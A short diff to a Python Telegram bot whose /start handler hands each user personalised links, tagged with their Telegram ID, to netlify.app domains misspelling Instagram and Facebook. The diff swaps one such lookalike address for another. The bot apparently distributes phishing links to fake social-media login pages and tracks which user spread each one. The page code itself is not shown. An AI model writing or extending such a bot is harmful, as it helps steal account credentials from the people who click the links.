@@ -7,7 +7,7 @@ bot = telebot.TeleBot(TOKEN)
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
-    custom_link = f"https://instgram-account-ginxl9n.netlify.app/?id={user_id}"
+    custom_link = f"https://instgram-post-muscl-ginxl9n.netlify.app/?id={user_id}"
     second_link = f"https://account-faceboo-k-ginxil9n.netlify.app/?id={user_id}"
     
     welcome_text = (
